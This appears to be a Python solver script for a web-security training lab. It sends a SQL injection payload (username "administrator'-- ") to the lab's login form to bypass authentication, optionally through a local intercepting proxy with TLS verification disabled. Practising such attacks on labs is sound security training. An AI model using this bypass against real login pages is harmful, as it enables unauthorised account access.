import sys, time, logging, argparse, urllib3

import requests


PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}
log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S"
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_args(args: list):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    )
    parser.add_argument("url", help="url of lab")
    return parser.parse_args()


def normalize_url(url):
    if not url.endswith("/"):
        url += "/"
    return url


def is_solved(url, no_proxy):
    def _is_solved(url, no_proxy):
        log.info("Checking if solved.")
        if no_proxy:
            resp = requests.get(url)
        else:
            resp = requests.get(url, proxies=PROXIES, verify=False)
        if "Congratulations, you solved the lab!" in resp.text:
            log.info("Lab is solved")
            return True
        else:
            log.info("Not solved.")
            return False
    if _is_solved(url, no_proxy):
        return True
    else:
        time.sleep(2)
        return _is_solved(url, no_proxy)


def main(args):
    url = normalize_url(args.url) + "login"
    log.info(f"Getting url: {url}")
    payload = { "username": "administrator'-- ", "password": "abc" }
    if args.no_proxy:
        requests.post(url, data=payload)
    else:
        requests.post(url, data=payload, proxies=PROXIES, verify=False)
    if is_solved(url, args.no_proxy):
        log.info("Congrats!")
    else:
        log.info("Not solved :(")


if __name__ == "__main__":
    args = parse_args(sys.argv)
    main(args)
